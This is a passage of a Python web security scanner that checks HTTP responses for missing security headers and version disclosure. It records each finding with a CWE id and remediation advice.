                    "fingerprint": hashlib.sha256(f"hsts_missing_{destination.host}".encode()).hexdigest(),
                    "cwe_id": "CWE-319",
                    "remediation": "Add 'Strict-Transport-Security: max-age=31536000; includeSubDomains; preload' to all HTTPS responses.",
                    "evidence": [{"status": status}],
                }
            )

        if not xfo and not (csp and "frame-ancestors" in csp.lower()):
            findings.append(
                {
                    "category": "security_misconfiguration",
                    "severity": "medium",
                    "title": "Missing Clickjacking Protection (X-Frame-Options / frame-ancestors)",
                    "description": "Neither X-Frame-Options nor CSP frame-ancestors is configured, allowing the site to be embedded in malicious iframes (Clickjacking).",
                    "target_url": destination.url,
                    "fingerprint": hashlib.sha256(f"xfo_missing_{destination.host}".encode()).hexdigest(),
                    "cwe_id": "CWE-1021",
                    "remediation": "Configure 'X-Frame-Options: SAMEORIGIN' or 'Content-Security-Policy: frame-ancestors \\'self\\''.",
                    "evidence": [{"headers_observed": list(headers.keys())}],
                }
            )

        if not xcto or "nosniff" not in xcto.lower():
            findings.append(
                {
                    "category": "security_misconfiguration",
                    "severity": "low",
                    "title": "Missing X-Content-Type-Options Header",
                    "description": "The X-Content-Type-Options: nosniff header is missing, allowing legacy browsers to MIME-sniff responses into executable content.",
                    "target_url": destination.url,
                    "fingerprint": hashlib.sha256(f"xcto_missing_{destination.host}".encode()).hexdigest(),
                    "cwe_id": "CWE-16",
                    "remediation": "Configure web server to return 'X-Content-Type-Options: nosniff'.",
                    "evidence": [{"header": xcto}],
                }
            )

        if server and any(char.isdigit() for char in server):
            findings.append(
                {
                    "category": "information_disclosure",
                    "severity": "low",
                    "title": f"Web Server Detailed Version Disclosure ({server})",
                    "description": f"The Server header reveals exact web server software and version numbers: '{server}', aiding targeted exploitation.",
                    "target_url": destination.url,
                    "fingerprint": hashlib.sha256(
                        f"server_leak_{destination.host}_{server}".encode()
                    ).hexdigest(),
                    "cwe_id": "CWE-200",
                    "remediation": "Disable server signature tokens in web server configuration (e.g., ServerTokens Prod in Apache, server_tokens off in Nginx).",
                    "evidence": [{"server_header": server}],
                }
            )

        if powered_by:
            findings.append(
                {
                    "category": "information_disclosure",
                    "severity": "low",
                    "title": f"Technology Stack Disclosure via X-Powered-By ({powered_by})",
                    "description": f"The X-Powered-By header discloses underlying backend framework: '{powered_by}'.",
                    "target_url": destination.url,
                    "fingerprint": hashlib.sha256(
                        f"powered_by_{destination.host}_{powered_by}".encode()
                    ).hexdigest(),
                    "cwe_id": "CWE-200",
                    "remediation": "Remove the X-Powered-By header from all application responses.",
                    "evidence": [{"x_powered_by": powered_by}],
                }
            )
    except Exception:
        pass

    # Normalize all findings so affected_url, target_url, and confidence are consistently populated
    for f in findings:
        aff = f.get("affected_url") or f.get("target_url") or destination.url
        f["affected_url"] = aff
        f["target_url"] = aff
        if "confidence" not in f:
            f["confidence"] = "high"

    check = {
        "category": "vulnerability_assessment",
        "status": "completed",
        "detail": f"Active vulnerability audit completed: {len(findings)} finding(s) identified across sensitive paths, active parameter fuzzing, and security headers.",
    }

    return {
        "findings": findings,
        "observations": observations,
        "check": check,
    }


__all__ = ["audit_deep_vulnerabilities"]
